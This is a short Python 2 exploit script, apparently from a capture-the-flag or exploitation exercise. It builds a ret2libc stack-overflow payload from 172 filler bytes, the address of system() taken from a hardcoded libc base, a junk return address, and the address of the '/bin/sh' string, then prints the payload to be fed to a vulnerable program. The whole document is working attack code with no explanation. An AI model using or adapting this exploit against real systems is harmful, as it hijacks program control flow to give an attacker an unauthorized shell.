#!/usr/bin/env python
#- * - coding:utf8-*-
from struct import *

start = 0x55585000
system = 0x0003f250
binsh = 0x0015EA2C
#exit = 0x00032f30
#scanf = 0x000551d0

payload = '\x44' * 172
payload += pack('<I', system+start)
#payload += pack("<I", exit+start)
#payload += pack("<I", scanf+start)
payload += "JUNK"
payload += pack("<I", binsh+start)
#payload += "\x80ls"

print payload

